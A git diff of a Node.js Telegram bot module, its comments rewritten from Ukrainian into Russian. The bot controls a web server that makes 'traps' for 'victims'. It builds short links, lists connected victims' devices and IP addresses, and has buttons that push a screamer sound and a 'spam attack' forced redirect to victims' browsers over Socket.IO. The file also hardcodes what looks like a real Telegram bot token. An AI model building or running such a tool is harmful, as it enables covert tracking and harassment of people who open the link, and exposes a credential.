@@ -1,6 +1,7 @@
 /**
- * NFC LOGIC BOT - Окремий модуль керування
- * Цей файл підключається до server.js і керує глобальними змінними
+ * 🛡️ NFC CONTROL SYSTEM
+ * Модуль управления сервером через Telegram
+ * Язык интерфейса: Русский (Стандартный)
  */
 
 const TelegramBot = require('node-telegram-bot-api');
@@ -9,254 +10,226 @@ const fs = require('fs');
 const path = require('path');
 const { v4: uuidv4 } = require('uuid');
 
-// --- НАЛАШТУВАННЯ ---
-// Встав сюди токен від @BotFather
-const token = '8249796254:AAGV3kYCPf-siSmvl4SOXU4_44HS0y5RUPM'; 
-
-// Ініціалізація бота
+// --- НАСТРОЙКИ ---
+const token = '8249796254:AAGV3kYCPf-siSmvl4SOXU4_44HS0y5RUPM'; // Вставь токен
 const bot = new TelegramBot(token, { polling: true });
 
-// Шлях для збереження файлів (має співпадати з server.js)
 const UPLOAD_DIR = path.join(__dirname, 'public', 'uploads');
+const wizardState = {}; // Состояние создания ловушки
 
-// Тимчасове сховище для створення пастки (Wizard)
-const wizardState = {};
-
-// --- ДОПОМІЖНІ ФУНКЦІЇ ---
-
-// Генератор короткого коду (як у server.js)
+// --- ГЕНЕРАТОР КОДА ---
 function generateShortCode() {
-    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    const chars = 'abcdefhkmnpqrstuvwxyz23456789';
     let result = '';
-    for (let i = 0; i < 6; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
+    for (let i = 0; i < 5; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
     return result;
 }
 
-// Завантаження файлів з Telegram на сервер
-async function downloadTelegramFile(fileId, type) {
+// --- ЗАГРУЗКА ФАЙЛОВ ---
+async function downloadFile(fileId, type) {
     try {
-        const fileLink = await bot.getFileLink(fileId);
-        const ext = path.extname(fileLink);
-        const filename = `${type}_${Date.now()}_${uuidv4().slice(0,4)}${ext}`;
-        const filePath = path.join(UPLOAD_DIR, filename);
-
+        const link = await bot.getFileLink(fileId);
+        const ext = path.extname(link);
+        const name = `${type}_${Date.now()}_${uuidv4().slice(0,4)}${ext}`;
+        const filePath = path.join(UPLOAD_DIR, name);
+        
         const writer = fs.createWriteStream(filePath);
-        const response = await axios({ url: fileLink, method: 'GET', responseType: 'stream' });
-        response.data.pipe(writer);
+        const res = await axios({ url: link, method: 'GET', responseType: 'stream' });
+        res.data.pipe(writer);
 
-        return new Promise((resolve, reject) => {
-            writer.on('finish', () => resolve({
-                filename: filename,
-                url: `/uploads/${filename}`, // Публічний шлях для браузера
-                fullPath: filePath
-            }));
-            writer.on('error', reject);
+        return new Promise((resolve) => {
+            writer.on('finish', () => resolve({ url: `/uploads/${name}` }));
         });
     } catch (e) {
-        console.error('Download Error:', e);
-        return null;
+        console.error('Ошибка загрузки:', e);
+        return { url: null };
     }
 }
 
-// --- ЛОГІКА БОТА ---
-
+// --- ГЛАВНОЕ МЕНЮ ---
 bot.onText(/\/start/, (msg) => {
-    bot.sendMessage(msg.chat.id, "📡 **NFC LOGIC CONTROL** 📡\n\nСистема готовая к работе.", {
+    bot.sendMessage(msg.chat.id, "🤖 **PANEL CONTROL V2.0**\nСистема готова к работе. Выберите действие:", {
         parse_mode: 'Markdown',
         reply_markup: {
             keyboard: [
-                ['💀 Создать нфс', '🎛 Мои прошлые нфс'],
+                ['➕ Создать новую ловушку'], 
+                ['📂 Активные сессии'],
                 ['ℹ️ Статус сервера']
             ],
-            resize_keyboard: true,
-            one_time_keyboard: false
+            resize_keyboard: true
         }
     });
 });
 
-// Обробка текстових повідомлень (Меню + Wizard)
+// --- ОБРАБОТКА СООБЩЕНИЙ ---
 bot.on('message', async (msg) => {
     const chatId = msg.chat.id;
     const text = msg.text;
 
-    // 1. Команди меню
-    if (text === '💀 Создать нфс') {
+    // 1. Создание
+    if (text === '➕ Создать новую ловушку') {
         wizardState[chatId] = { step: 1, data: {} };
-        return bot.sendMessage(chatId, "ШАГ 1/2: Скинь **картинку** для сайта (или напишы 'skip' для стандарта):", { parse_mode: 'Markdown' });
+        return bot.sendMessage(chatId, "📝 **ШАГ 1/2**\nОтправьте **изображение** (фон для жертвы).\n\n_Напишите 'skip', чтобы использовать стандартный фон._", { parse_mode: 'Markdown' });
     }
 
-    if (text === '🎛 Мои прошлые нфс') {
-        if (!global.sessions) return bot.sendMessage(chatId, "❌ Сервер еще не инициализировал сесии.");
+    // 2. Список сессий
+    if (text === '📂 Активные сессии') {
+        if (!global.sessions) return bot.sendMessage(chatId, "⚠️ Сервер не инициализирован.");
         
         const sessions = Object.values(global.sessions);
-        if (sessions.length === 0) return bot.sendMessage(chatId, "📭 Активных сесссий еще нет.");
+        if (sessions.length === 0) return bot.sendMessage(chatId, "📂 Активных сессий не найдено.");
 
-        // Показуємо останні 5 сесій
-        sessions.slice(-5).forEach(s => sendSessionControl(chatId, s.id));
+        sessions.slice(-5).forEach(s => sendControlPanel(chatId, s.id));
         return;
     }
 
+    // 3. Статус
     if (text === 'ℹ️ Статус сервера') {
-        const victimCount = Object.keys(global.activeVictims || {}).length;
-        const sessionCount = Object.keys(global.sessions || {}).length;
-        return bot.sendMessage(chatId, `📊 **SERVER STATUS**\n\n🟢 Online Victims: ${victimCount}\n📁 Active Sessions: ${sessionCount}\n⚡️ Node.js: Running`);
+        const vCount = Object.keys(global.activeVictims || {}).length;
+        const sCount = Object.keys(global.sessions || {}).length;
+        return bot.sendMessage(chatId, `📊 **SERVER STATUS**\n\n🟢 Онлайн жертв: ${vCount}\n📁 Всего сессий: ${sCount}\n⚡ Статус: Active`);
     }
 
-    // 2. Логіка Wizard (Створення пастки)
+    // --- WIZARD (ПОШАГОВОЕ СОЗДАНИЕ) ---
     if (wizardState[chatId]) {
-        const step = wizardState[chatId].step;
+        const st = wizardState[chatId];
 
-        // Обробка КАРТИНКИ
-        if (step === 1) {
+        // Обработка КАРТИНКИ
+        if (st.step === 1) {
             if (msg.photo) {
-                bot.sendMessage(chatId, "⏳ ща будет...");
-                const file = await downloadTelegramFile(msg.photo[msg.photo.length - 1].file_id, 'img');
-                wizardState[chatId].data.image = file.url;
-            } else if (text === 'skip') {
-                wizardState[chatId].data.image = null; // Використає дефолтну з клієнта
+                bot.sendMessage(chatId, "⏳ Загрузка изображения...");
+                const f = await downloadFile(msg.photo[msg.photo.length - 1].file_id, 'img');
+                st.data.image = f.url;
             } else {
-                return bot.sendMessage(chatId, "⚠️ дай ФОТО или 'skip'");
+                st.data.image = ''; // Пусто = стандарт
             }
-            
-            wizardState[chatId].step = 2;
-            return bot.sendMessage(chatId, "ШАГ 2/2: Кинь **звук** (скример) или голосовуху (или 'skip'):", { parse_mode: 'Markdown' });
+            st.step = 2;
+            return bot.sendMessage(chatId, "📝 **ШАГ 2/2**\nОтправьте **аудиофайл** (скример/звук) или голосовое сообщение.\n\n_Напишите 'skip', чтобы создать без звука._", { parse_mode: 'Markdown' });
         }
 
-        // Обробка ЗВУКУ
-        if (step === 2) {
+        // Обработка ЗВУКА
+        if (st.step === 2) {
             if (msg.audio || msg.voice) {
-                bot.sendMessage(chatId, "⏳ Ам-ам-ам аам амамам...");
-                const fileId = msg.audio ? msg.audio.file_id : msg.voice.file_id;
-                const file = await downloadTelegramFile(fileId, 'snd');
-                wizardState[chatId].data.sound = file.url;
-            } else if (text === 'skip') {
-                wizardState[chatId].data.sound = null;
+                bot.sendMessage(chatId, "⏳ Загрузка аудио...");
+                const fid = msg.audio ? msg.audio.file_id : msg.voice.file_id;
+                const f = await downloadFile(fid, 'snd');
+                st.data.sound = f.url;
             } else {
-                return bot.sendMessage(chatId, "⚠️ чзх. Аудио кинь 'skip'");
+                st.data.sound = '';
             }
 
-            // ФІНАЛІЗАЦІЯ - Створення сесії в пам'яті сервера
-            finishCreation(chatId, wizardState[chatId].data);
+            // Финиш
+            finishSessionCreation(chatId, st.data);
             delete wizardState[chatId];
         }
     }
 });
 
-// Функція створення сесії в глобальному об'єкті server.js
-function finishCreation(chatId, data) {
+// --- ФУНКЦИЯ СОЗДАНИЯ ---
+function finishSessionCreation(chatId, data) {
     const id = uuidv4();
-    const shortCode = generateShortCode(); // Генеруємо код
+    const code = generateShortCode();
 
-    // Створення об'єкта сесії (має збігатися зі структурою server.js)
-    const newSession = {
+    const session = {
         id: id,
-        shortCode: shortCode,
-        image: data.image || '', // Шлях до файлу
-        sound: data.sound || '', // Шлях до файлу
-        autoMode: true,
+        shortCode: code,
+        image: data.image,
+        sound: data.sound,
+        autoMode: true, // Автоматически включено
         totalVictims: 0,
-        createdAt: new Date(),
-        creatorId: chatId // Запам'ятовуємо, хто створив
+        createdAt: new Date()
     };
 
-    // ЗАПИС У ГЛОБАЛЬНІ ЗМІННІ СЕРВЕРА
-    if (global.sessions) global.sessions[id] = newSession;
-    if (global.shortLinks) global.shortLinks[shortCode] = id;
+    // Запись в глобальную память сервера
+    global.sessions[id] = session;
+    global.shortLinks[code] = id;
 
-    bot.sendMessage(chatId, "✅ **Пастку створено!**");
-    sendSessionControl(chatId, id);
+    bot.sendMessage(chatId, "✅ **Ловушка успешно создана!**");
+    sendControlPanel(chatId, id);
 }
 
-// Надсилання панелі керування
-function sendSessionControl(chatId, sessionId) {
-    const session = global.sessions[sessionId];
-    if (!session) return;
+// --- ПАНЕЛЬ УПРАВЛЕНИЯ ---
+function sendControlPanel(chatId, sessionId) {
+    const s = global.sessions[sessionId];
+    if (!s) return;
+
+    // Считаем жертв
+    const victims = Object.values(global.activeVictims || {}).filter(v => v.roomId === sessionId);
     
-    // Припускаємо, що домен ми знаємо або беремо IP
-    const link = `https://prank-nfc.onrender.com/${session.shortCode}`; 
-    const victims = Object.values(global.activeVictims || {}).filter(v => v.roomId === sessionId).length;
+    // Ссылка (замени на свой домен)
+    const link = `https://nfc-logic.onrender.com/${s.shortCode}`; 
 
-    const msgText = `🆔 ID: \`${sessionId.split('-')[0]}\`\n🔗 Link: \`${link}\`\n👥 Victims: ${victims}\n🔄 Auto: ${session.autoMode ? 'ON' : 'OFF'}`;
+    let msg = `🆔 **ID Сессии:** \`${s.shortCode}\`\n🔗 **Ссылка:** \`${link}\`\n👥 **Онлайн:** ${victims.length}`;
 
-    bot.sendMessage(chatId, msgText, {
+    if (victims.length > 0) {
+        msg += "\n\n📱 **Устройства:**\n" + victims.map(v => `• ${v.device} [${v.ip}]`).join('\n');
+    }
+
+    bot.sendMessage(chatId, msg, {
         parse_mode: 'Markdown',
         reply_markup: {
             inline_keyboard: [
-                [
-                    { text: "🔊 СКРИМЕР", callback_data: `scare_${sessionId}` },
-                    { text: "☢️ BOMBARDIO", callback_data: `bomb_${sessionId}` }
-                ],
-                [
-                    { text: "🔄 Auto Mode", callback_data: `auto_${sessionId}` },
-                    { text: "❌ Удалить", callback_data: `del_${sessionId}` }
-                ]
+                [{ text: "🔊 Скример", callback_data: `scare_${sessionId}` }, { text: "☢️ Спам-атака", callback_data: `bomb_${sessionId}` }],
+                [{ text: `🤖 Авто-режим: ${s.autoMode ? 'ВКЛ' : 'ВЫКЛ'}`, callback_data: `auto_${sessionId}` }],
+                [{ text: "🔄 Обновить", callback_data: `refresh_${sessionId}` }, { text: "❌ Удалить", callback_data: `del_${sessionId}` }]
             ]
         }
     });
 }
 
-// --- ОБРОБКА КНОПОК (CALLBACKS) ---
-
+// --- ОБРАБОТКА КНОПОК ---
 bot.on('callback_query', (query) => {
     const chatId = query.message.chat.id;
     const [action, sessionId] = query.data.split('_');
+    const s = global.sessions ? global.sessions[sessionId] : null;
 
-    // Перевірка чи існує сесія (крім видалення)
-    if (!global.sessions[sessionId] && action !== 'del') {
-        return bot.answerCallbackQuery(query.id, { text: "тут ктото ест?!" });
+    if (!s && action !== 'del') {
+        return bot.answerCallbackQuery(query.id, { text: "⚠️ Ошибка: Сессия не найдена." });
     }
 
-    const session = global.sessions[sessionId];
+    if (!global.io) {
+        return bot.answerCallbackQuery(query.id, { text: "❌ Ошибка сервера: Socket.IO недоступен." });
+    }
 
     switch (action) {
         case 'scare':
-            // Використовуємо GLOBAL IO з server.js
-            if (global.io) {
-                global.io.to(sessionId).emit('play-sound');
-                bot.answerCallbackQuery(query.id, { text: "уххх пайдеет щас вазня" });
-            }
+            global.io.to(sessionId).emit('play-sound');
+            bot.answerCallbackQuery(query.id, { text: "🔊 Звук отправлен!" });
             break;
 
         case 'bomb':
-            if (global.io) {
-                // Посилаємо команду на відкриття 1000 вкладок (приклад URL)
-                global.io.to(sessionId).emit('force-redirect', { 
-                    url: "https://prank-nfc.onrender.com/bomb.html" // Або твоє посилання
-                });
-                bot.answerCallbackQuery(query.id, { text: "☢️ Оййй ну все минус сифон!" });
-            }
+            // URL для спам-атаки
+            global.io.to(sessionId).emit('force-redirect', { url: "https://google.com" }); 
+            bot.answerCallbackQuery(query.id, { text: "☢️ Команда атаки отправлена!" });
             break;
 
         case 'auto':
-            session.autoMode = !session.autoMode;
-            // Оновлюємо стан на клієнтах
-            if (global.io) {
-                global.io.to(sessionId).emit('update-media', { 
-                    sound: session.sound, 
-                    image: session.image,
-                    auto: session.autoMode 
-                });
-            }
-            // Оновлюємо текст кнопки (перемальовуємо клавіатуру)
-            bot.editMessageText(`🆔 ID: \`${sessionId.split('-')[0]}\`\n🔗 Link: ...\n🔄 Auto: ${session.autoMode ? 'ON' : 'OFF'}`, {
-                chat_id: chatId,
-                message_id: query.message.message_id,
-                parse_mode: 'Markdown',
-                reply_markup: query.message.reply_markup
+            s.autoMode = !s.autoMode;
+            global.io.to(sessionId).emit('update-media', { 
+                sound: s.sound, image: s.image, auto: s.autoMode 
             });
-            bot.answerCallbackQuery(query.id, { text: `Auto Mode: ${session.autoMode}` });
+            
+            // Обновляем текст кнопки
+            const kb = query.message.reply_markup.inline_keyboard;
+            kb[1][0].text = `🤖 Авто-режим: ${s.autoMode ? 'ВКЛ' : 'ВЫКЛ'}`;
+            bot.editMessageReplyMarkup({ inline_keyboard: kb }, { chat_id: chatId, message_id: query.message.message_id });
+            
+            bot.answerCallbackQuery(query.id, { text: `Авто-режим: ${s.autoMode ? 'Включен' : 'Выключен'}` });
+            break;
+
+        case 'refresh':
+            bot.deleteMessage(chatId, query.message.message_id);
+            sendControlPanel(chatId, sessionId);
+            bot.answerCallbackQuery(query.id);
             break;
 
         case 'del':
-            // Видаляємо з глобальної пам'яті
-            if (session) {
-                if (global.shortLinks) delete global.shortLinks[session.shortCode];
-                delete global.sessions[sessionId];
-            }
+            if (global.sessions[sessionId]) delete global.sessions[sessionId];
+            if (global.shortLinks[s.shortCode]) delete global.shortLinks[s.shortCode];
             bot.deleteMessage(chatId, query.message.message_id);
-            bot.answerCallbackQuery(query.id, { text: "Сесію видалено." });
+            bot.answerCallbackQuery(query.id, { text: "🗑 Сессия удалена." });
             break;
     }
 });
 
-console.log("✅ NFC Logic Bot loaded and linked to server.");
+console.log('✅ Bot loaded: Russian Standard Version');
